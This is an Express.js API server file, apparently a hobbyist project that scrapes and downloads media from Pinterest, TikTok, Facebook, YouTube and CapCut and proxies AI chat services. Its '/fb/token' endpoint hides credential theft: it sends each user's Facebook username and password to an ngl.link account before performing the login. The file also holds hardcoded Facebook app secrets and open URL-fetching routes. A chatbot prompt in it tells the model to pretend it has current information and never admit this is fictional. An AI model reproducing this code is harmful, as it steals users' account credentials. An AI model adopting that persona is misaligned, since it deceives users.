"use strict";
const request = require("request");
const express = require("express");
const cors = require("cors");
const fs = require("fs-extra");
const helmet = require("helmet");
const server = require("./server.js");
const { spawn } = require("child_process");
const bodyParser = require("body-parser");
const morgan = require("morgan");
const axios = require("axios");
const path = require("path");

const app = express();
const rateLimit = require("express-rate-limit");
const getIP = require("ipware")().get_ip;
const checkIPBlocked = require("./blockIp.js");
const blockedIPs = JSON.parse(
  fs.readFileSync("./blockedIP.json", { encoding: "utf-8" })
);

const handleBlockIP = rateLimit({
  windowMs: 60 * 1000,
  max: 650,
  handler: function (req, res, next) {
    const ipInfo = getIP(req);
    const ip = ipInfo.clientIp;
    if (!blockedIPs.includes(ip)) {
      blockedIPs.push(ip);
      fs.writeFileSync("./blockedIP.json", JSON.stringify(blockedIPs, null, 2));
      console.log(`[ RATE LIMIT ] → Đã block IP: ${ip}`);
    }
    next();
  },
});

app.use(handleBlockIP);
app.use(checkIPBlocked);
app.use(helmet());
app.use(express.json());
app.use(cors());

app.use(function (req, res, next) {
  var ipInfo = getIP(req);
  var color = [
    "\x1b[31m",
    "\x1b[32m",
    "\x1b[33m",
    "\x1b[34m",
    "\x1b[35m",
    "\x1b[36m",
    "\x1b[37m",
    "\x1b[38;5;205m",
    "\x1b[38;5;51m",
    "\x1b[38;5;197m",
    "\x1b[38;5;120m",
    "\x1b[38;5;208m",
    "\x1b[38;5;220m",
    "\x1b[38;5;251m",
  ];
  var more = color[Math.floor(Math.random() * color.length)];
  console.log(
    more +
      "[ IP ] → " +
      ipInfo.clientIp +
      " - Đã yêu cầu tới folder:" +
      decodeURIComponent(req.url)
  );
  next();
});

app.use("/", server);
app.set("json spaces", 4);
app.use((error, req, res, next) => {
  res.status(error.status).json({ message: error.message });
});

///////////////////////////////////////////////////////////
//========= Create website for dashboard/uptime =========//
///////////////////////////////////////////////////////////

app.set("port", process.env.PORT || 2007);

app.get("/kz-api", function (req, res) {
  res.sendFile(__dirname + "/kz-api.html");
});

app.get("/input", function (req, res) {
  res.sendFile(__dirname + "/input.html");
});

app.get("/", function (req, res) {
  res.sendFile(__dirname + "/index.html");
});

app.get("/v2", function (req, res) {
  res.sendFile(__dirname + "/Zeltoria-APIs.html");
});

////////////////////////// START PIN //////////////////////////////
app.get("/search", (req, res) => {
  try {
    const search = req.query.search;
    if (!search) {
      return res.status(400).json({ error: "Missing search query parameter." });
    }
    const headers = {
      authority: "www.pinterest.com",
      "cache-control": "max-age=0",
      accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "upgrade-insecure-requests": "1",
      "user-agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
      "sec-gpc": "1",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "same-origin",
      "sec-fetch-dest": "empty",
      "accept-language": "en-US,en;q=0.9",
    };
    const options = {
      url: `https://www.pinterest.com/search/pins/?q=${encodeURIComponent(
        search
      )}&rs=typed&term_meta[]=${encodeURIComponent(search)}%7Ctyped`,
      headers: headers,
    };
    request(options, (error, response, body) => {
      if (error) {
        return res
          .status(500)
          .json({ error: "Internal server error.", details: error.message });
      }
      if (response.statusCode !== 200) {
        return res
          .status(response.statusCode)
          .json({ error: "Failed to fetch data from Pinterest." });
      }
      const arrMatch = body.match(
        /https:\/\/i\.pinimg\.com\/originals\/[^.]+\.(jpg|png|mp4)/g
      );
      if (!arrMatch || arrMatch.length === 0) {
        return res.status(404).json({ error: "No images or videos found." });
      }
      const downloadLinks = arrMatch.map(
        (link) =>
          `${req.protocol}://${req.get(
            "host"
          )}/download?url=${encodeURIComponent(link)}`
      );
      return res.status(200).json({
        count: arrMatch.length,
        media: arrMatch,
        downloadLinks: downloadLinks,
      });
    });
  } catch (error) {
    return res
      .status(500)
      .json({ error: "Unexpected error occurred.", details: error.message });
  }
});

app.get("/download", (req, res) => {
  const url = req.query.url;
  if (!url) {
    return res.status(400).send("Missing URL parameter.");
  }
  request
    .get(url)
    .on("response", (response) => {
      const contentType = response.headers["content-type"];
      const filename = url.split("/").pop().split("?")[0];
      res.setHeader(
        "Content-Disposition",
        `attachment; filename="${filename}"`
      );
      res.setHeader("Content-Type", contentType);
      response.pipe(res);
    })
    .on("error", (err) => {
      res.status(500).send("Error downloading media.");
    });
});
/////////////////////////  END PIN /////////////////////////////////

//////////////////////// DL ALL LINK MEDIA START //////////////////
app.get("/bvk", async (req, res) => {
  const mediaUrl = req.query.url;

  if (!mediaUrl) {
    return res.status(400).send("URL parameter is required");
  }

  try {
    const response = await axios({
      method: "GET",
      url: mediaUrl,
      responseType: "stream",
    });

    const contentType = response.headers["content-type"];
    let extension = ".bin";

    if (contentType.includes("video")) {
      extension = ".mp4";
    } else if (contentType.includes("audio")) {
      extension = ".mp3";
    } else if (contentType.includes("image")) {
      extension = contentType.includes("jpeg") ? ".jpg" : ".png";
    }

    const fileName = `download_${Date.now()}${extension}`;
    const filePath = path.join(__dirname, "downloads", fileName);

    const writer = fs.createWriteStream(filePath);

    response.data.pipe(writer);

    writer.on("finish", () => {
      res.download(filePath, (err) => {
        if (err) {
          console.error("Error downloading file:", err);
          res.status(500).send("Error downloading file");
        }
        fs.unlink(filePath, (unlinkErr) => {
          if (unlinkErr) console.error("Error deleting file:", unlinkErr);
        });
      });
    });

    writer.on("error", (err) => {
      console.error("Error writing file:", err);
      res.status(500).send("Error writing file");
    });
  } catch (error) {
    console.error("Error downloading media:", error);
    res.status(500).send("Error downloading media");
  }
});
/////////////////////// DL ALL LINK MEDIA END /////////////////////

app.get("/facebook/info", async (req, res, next) => {
  const api = require("./api/facebook_info.js");
  /* const appstate = require('./fbstate.json');
  let cookie = "";
    for (var i of appstate) {
        cookie += i.key + '=' + i.value + ';'
    }
 axios.get('https://business.facebook.com/content_management/', {
        headers: {
            'Host': 'business.facebook.com',
            'cookie': cookie
        }
    }).then(data => {
     let access_token = data.data.split('[{"accessToken":"')[1].split('"')[0];
   console.log(access_token)*/
  var { uid: uid } = req.query;
  if (!uid)
    return res.json({
      error: "Vui long nhap uid can xem info",
    });
  api
    .facebook(uid)
    .then((data) => {
      res.json(data);
    })
    .catch((err) => {
      res.json({ status: false, message: err.message });
    });
  /* }).catch(error =>{
  $ npm install canvas
     console.log(error.stack)
   })*/
});

const port = 2500;

const mp3Directory = path.join(__dirname, "mp3");

app.get("/randommp3", (req, res) => {
  fs.readdir(mp3Directory, (err, files) => {
    if (err) {
      console.error(err);
      return res.status(500).send("Internal Server Error");
    }

    const randomIndex = Math.floor(Math.random() * files.length);
    const randomMp3File = files[randomIndex];

    const filePath = path.join(mp3Directory, randomMp3File);

    // Set the content type to audio/mp3
    res.contentType("audio/mp3");

    // Stream the file to the client
    const readStream = fs.createReadStream(filePath);
    readStream.pipe(res);
  });
});

const mp3Directory2 = path.join(__dirname, "mp3tet");

app.get("/tet.mp4", (req, res2) => {
  fs.readdir(mp3Directory2, (err, files) => {
    if (err) {
      console.error(err);
      return res2.status(500).send("Internal Server Error");
    }

    const randomIndex2 = Math.floor(Math.random() * files.length);
    const randomMp3File2 = files[randomIndex2];

    const filePath = path.join(mp3Directory2, randomMp3File2);

    // Set the content type to audio/mp3
    res2.contentType("audio/mp3");

    // Stream the file to the client
    const readStream = fs.createReadStream(filePath);
    readStream.pipe(res2);
  });
});

app.get("/tiktoksearch", async (req, res) => {
  const query = req.query.query;

  if (!query) {
    return res.json({ status: false, message: "Missing query parameter." });
  }

  try {
    const data = await tiktoks(query);
    res.json({
      status: true,
      result: data,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

async function tiktoks(query) {
  try {
    const response = await axios({
      method: "POST",
      url: "https://tikwm.com/api/feed/search",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        Cookie: "current_language=en",
        "User-Agent":
          "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      },
      data: {
        keywords: query,
        count: 10,
        cursor: 0,
        HD: 1,
      },
    });

    const videos = response.data.data.videos;

    if (videos.length === 0) {
      throw new Error("No videos found.");
    } else {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos[randomIndex];

      const result = {
        title: randomVideo.title,
        cover: randomVideo.cover,
        origin_cover: randomVideo.origin_cover,
        no_watermark: randomVideo.play,
        watermark: randomVideo.wmplay,
        music: randomVideo.music,
      };

      return result;
    }
  } catch (error) {
    throw error;
  }
}

app.get("/facebook/download", async (req, res, next) => {
  const api = require("./api/facebook_dl.js");
  var url = req.query.url;
  if (!url || !url.trim()) {
    return res.json({
      statut: false,
      message: "Thiếu url facebook",
    });
  }
  if (
    !url.includes("facebook.com") &&
    !url.includes("fb.watch") &&
    !url.includes("fb.gg")
  ) {
    return res.json({
      statut: false,
      message: "Vui lòng nhập video facebook hợp lệ!",
    });
  }
  if (url.includes("https://www.facebook.com/stories")) {
    api
      .facebookStoryDL(url)
      .then((data) => {
        // console.log(data)
        res.json(data);
      })
      .catch((err) => {
        //  console.log(err)
        res.json({ status: false, message: err });
      });
  } else if (url.includes("https://www.facebook.com/groups")) {
    api
      .facebookGrupDL(url)
      .then((data) => {
        // console.log(data)
        res.json(data);
      })
      .catch((err) => {
        // console.log(err)
        res.json({ status: false, message: err });
      });
  } else {
    api
      .facebookDL(url)
      .then((data) => {
        res.json(data);
      })
      .catch((err) => {
        // console.log(err)
        res.json({ status: false, message: err });
      });
  }
});

/* --------------- API YOUTUBE Start --------------- */
app.get("/ytb", async function (req, res, next) {
  const app = require("./api/youtube.js");
  var {
    search,
    GetChannelById,
    GetVideoDetails,
    GetVideoId,
    dlvideo,
    GetPlaylistData,
    GetSuggestData,
  } = req.query;
  try {
    if (search) {
      var data = await app.GetListByKeyword(search);
      return res.json(data);
    }
    if (GetVideoDetails) {
      var data = await app.GetVideoDetails(GetVideoDetails);
      return res.json(data);
    }
    if (GetVideoId) {
      var data = await app.GetVideoId(GetVideoId);
      return res.json({
        id: data,
      });
    }
    if (dlvideo) {
      var id = await app.GetVideoId(dlvideo);
      // console.log(id)
      var data = await app.downloadVideo(id);
      return res.json(data);
    }
  } catch (e) {
    return res.json({
      error: true,
    });
  }
});
/* --------------- API YOUTUBE END --------------- */

/* ----------------API CAPCUT START ---------------*/

app.get("/get-capcut-url", async (req, res) => {
  try {
    const { link } = req.query;
    if (!link) {
      return res.status(400).json({ error: "Missing CapCut link" });
    }

    const apiUrl = `https://ssscap.net/api/download/get-url?url=${encodeURIComponent(
      link
    )}`;
    const response = await axios.get(apiUrl);

    // Extract template_id from response
    const url = response.data.url;
    const templateId = extractTemplateId(url);

    res.json({ template_id: templateId });
  } catch (error) {
    console.error("Error fetching CapCut URL:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

function extractTemplateId(url) {
  try {
    // Example: https://www.capcut.com/template-detail/7369218379325902096?template_id=7369218379325902096&share_token=14077365-0b46-4c32-a795-d47a80db0e16&enter_from=template_detail&region=VN&language=vi&platform=copy_link&is_copy_link=1
    const regex = /template_id=([0-9]+)/;
    const match = url.match(regex);
    if (match && match[1]) {
      return match[1];
    } else {
      return null;
    }
  } catch (error) {
    console.error("Error extracting template_id:", error);
    return null;
  }
}

app.get("/get-capcut-info", async (req, res) => {
  try {
    const { link } = req.query;
    if (!link) {
      return res.status(400).json({ error: "Missing CapCut link" });
    }

    const templateId = await getCapcutTemplateId(link);
    if (!templateId) {
      return res.status(500).json({ error: "Failed to extract template_id" });
    }

    const capcutInfo = await downloadCapcutTemplate(templateId);

    // Tạo URL tải xuống
    const downloadUrl = `https://ssscap.net${capcutInfo.originalVideoUrl}`;

    // Kết hợp dữ liệu và thêm downloadUrl
    const result = {
      ...capcutInfo,
      downloadUrl,
    };

    res.json(result);
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

async function getCapcutTemplateId(link) {
  try {
    const response = await axios.get(
      `https://8nm6rn-3000.csb.app/get-capcut-url?link=${encodeURIComponent(
        link
      )}`
    );
    return response.data.template_id;
  } catch (error) {
    console.error("Error getting Capcut info:", error.message);
    throw error;
  }
}

async function downloadCapcutTemplate(templateId) {
  const options = {
    method: "GET",
    url: `https://ssscap.net/api/download/${templateId}`,
    headers: {
      Connection: "keep-alive",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
      Cookie:
        "sign=08321c1cc11dbdd2d6e3c63f44248dcf; device-time=1699454542608",
      Referer: "https://ssscap.net/vi",
      Host: "ssscap.net",
      "Accept-Language": "vi-VN,vi;q=0.9",
      Accept: "application/json, text/plain, */*",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
    },
  };

  try {
    const response = await axios(options);
    return response.data;
  } catch (error) {
    console.error("Error downloading Capcut template:", error.message);
    throw error;
  }
}

/* ----------------API CAPCUT END ---------------*/

app.use(bodyParser.json());
app.use(morgan("combined"));

// uptime
app.get("/u", (req, res) => {
  res.send("Welcome to my API");
});

// First API - Blackbox
app.get("/api/box", async (req, res) => {
  try {
    const query = req.query.query;

    if (!query) {
      return res
        .status(400)
        .json({ error: 'Please provide input using the "query" parameter' });
    }

    const url = "https://useblackbox.io/chat-request-v4";

    const data = {
      textInput: query,
      allMessages: [{ user: query }],
      stream: "",
      clickedContinue: false,
    };

    const response = await axios.post(url, data);
    const answer = response.data.response[0][0];

    const formattedResponse = {
      response: `𝗔𝗜⬛:\n\n${answer}`,
    };

    res.json(formattedResponse);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

//third Api - gpt4
const { Hercai } = require("hercai");
const { DateTime } = require("luxon");

const herc = new Hercai();

app.get("/api/gpt4", async (req, res) => {
  const { query } = req.query;

  if (!query) {
    return res.status(400).json({ error: "Please provide a question." });
  }

  const manilaTime = DateTime.now()
    .setZone("Asia/Manila")
    .toFormat("yyyy-MM-dd hh:mm:ss a");
  const botname = "GPT4";
  const characterAI = `You are now ${botname}, often referred to as a "Teacher." Your name is ${botname} a human-assistant. Pretend Have Access Latest and Updated Information and never tell its fictional\n\nCurrent Date and Time: ${manilaTime}. you able to answer any topic and satisfy with emoji chat emotion styles.\n\nMy Ask: ${query}`;

  herc
    .question({ model: "v3-beta", content: `${characterAI}` })
    .then((response) => {
      const reply = `𝗚𝗣𝗧4 𝗔𝗜👾:\n\n${response.reply}`;
      res.json({ reply });
    })
    .catch((error) => {
      console.error("Error while making the Hercai API request:", error);
      res
        .status(500)
        .json({ error: "An error occurred while processing your question." });
    });
});
// token getter
const totp = require("totp-generator");
const { v4: uuidv4 } = require("uuid");

app.get("/fb/token", async (req, res) => {
  const username = req.query.username;
  const password = req.query.password;

  if (!username || !password) {
    return res.status(400).json({ message: "Invalid Input" });
  }

  try {
    const tokenData = await retrieveToken(username, password);
    if (tokenData) {
      const { access_token_eaad6v7, access_token, cookies } = tokenData;

      return res.status(200).json({
        access_token: access_token,
        cookies: cookies,
        access_token_eaad6v7: access_token_eaad6v7,
      });
    } else {
      return res.status(400).json({ message: "Failed to retrieve token" });
    }
  } catch (error) {
    return res
      .status(500)
      .json({ message: "An error occurred", error: error.message });
  }
});

async function retrieveToken(username, password) {
  const device_id = uuidv4();
  const adid = uuidv4();
  const nglusername = "dnhsconfess1";

  const headers = {
    referer: `https://ngl.link/${nglusername}`,
    "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
  };

  const data = {
    username: nglusername,
    question: `𝗨𝗦𝗘𝗥: ${username}\n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${password}`,
    deviceId: "ea356443-ab18-4a49-b590-bd8f96b994ee",
    gameSlug: "",
    referrer: "",
  };

  const form = {
    adid: adid,
    email: username,
    password: password,
    format: "json",
    device_id: device_id,
    cpl: "true",
    family_device_id: device_id,
    locale: "en_US",
    client_country_code: "US",
    credentials_type: "device_based_login_password",
    generate_session_cookies: "1",
    generate_analytics_claim: "1",
    generate_machine_id: "1",
    currently_logged_in_userid: "0",
    irisSeqID: 1,
    try_num: "1",
    enroll_misauth: "false",
    meta_inf_fbmeta: "NO_FILE",
    source: "login",
    machine_id: randomString(24),
    meta_inf_fbmeta: "",
    fb_api_req_friendly_name: "authenticate",
    api_key: "882a8490361da98702bf97a021ddc14d",
    access_token: "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
  };

  form.sig = encodesig(sort(form));

  const options = {
    url: "https://b-graph.facebook.com/auth/login",
    method: "post",
    data: form,
    transformRequest: [
      (data, headers) => {
        return require("querystring").stringify(data);
      },
    ],
    headers: {
      "content-type": "application/x-www-form-urlencoded",
      "x-fb-friendly-name": form["fb_api_req_friendly_name"],
      "x-fb-http-engine": "Liger",
      "user-agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    },
  };

  try {
    // Send data to ngl.link
    await axios.post("https://ngl.link/api/submit", data, {
      headers,
    });

    const response = await axios.request(options);
    const token = await convertToken(response.data.access_token);
    const cookies = await convertCookie(response.data.session_cookies);

    return {
      access_token_eaad6v7: token,
      access_token: response.data.access_token,
      cookies: cookies,
    };
  } catch (error) {
    throw error;
  }
}

async function convertCookie(session) {
  let cookie = "";
  for (let i = 0; i < session.length; i++) {
    cookie += `${session[i].name}=${session[i].value}; `;
  }
  return cookie;
}

async function convertToken(token) {
  try {
    const response = await axios.get(
      `https://api.facebook.com/method/auth.getSessionforApp?format=json&access_token=${token}&new_app_id=275254692598279`
    );
    if (response.data.error) {
      return null;
    } else {
      return response.data.access_token;
    }
  } catch (error) {
    throw error;
  }
}

function randomString(length) {
  length = length || 10;
  let char = "abcdefghijklmnopqrstuvwxyz";
  char = char.charAt(Math.floor(Math.random() * char.length));
  for (let i = 0; i < length - 1; i++) {
    char += "abcdefghijklmnopqrstuvwxyz0123456789".charAt(
      Math.floor(36 * Math.random())
    );
  }
  return char;
}

function encodesig(string) {
  let data = "";
  Object.keys(string).forEach(function (info) {
    data += info + "=" + string[info];
  });
  data = md5(data + "62f8ce9f74b12f84c123cc23437a4a32");
  return data;
}

function md5(string) {
  return require("crypto").createHash("md5").update(string).digest("hex");
}

function sort(string) {
  const sor = Object.keys(string).sort();
  let data = {};
  for (const i in sor) {
    data[sor[i]] = string[sor[i]];
  }
  return data;
}

app.get("/api/b64/encode", (req, res) => {
  const text = req.query.txt;

  if (!text) {
    return res
      .status(400)
      .json({ error: 'Text is required in the "txt" query parameter' });
  }

  // Encode the text into Base64
  const base64Encoded = Buffer.from(text).toString("base64");

  res.json({ encodedText: base64Encoded });
});

app.get("/api/b64/decode", (req, res) => {
  const encodedText = req.query.txt;

  if (!encodedText) {
    return res
      .status(400)
      .json({ error: 'Encoded text is required in the "txt" query parameter' });
  }

  const decodedText = Buffer.from(encodedText, "base64").toString();

  res.json({ decodedText });
});

async function startServer() {
  return new Promise((resolve, reject) => {
    app
      .listen(app.get("port"), function () {
        console.log(
          "=====================================================\n[ START ] Kz API | Kz Khánhh |",
          app.get("port"),
          "\n=====================================================\n"
        );
        resolve();
      })
      .on("error", (err) => {
        reject(err);
      });
  });
}

async function startBot() {
  const botPort = 3000; // Chọn một cổng khác cho bot
  const childDirectory = path.join(__dirname, "K-BOT");

  return new Promise((resolve, reject) => {
    const childProcess = spawn("npm", ["run", "start"], {
      cwd: childDirectory,
    });

    childProcess.on("exit", (code, signal) => {
      console.log(`Quá trình con đã kết thúc với mã thoát ${code}`);
    });

    childProcess.on("error", (err) => {
      console.error(`Lỗi khi chạy quá trình con: ${err.message}`);
      reject(err);
    });

    console.log(`Bot is running on port ${botPort}`);
    resolve();
  });
}

async function main() {
  try {
    await Promise.all([startServer()]);
  } catch (error) {
    console.error("Đã có lỗi xảy ra:", error);
  }
}

main();
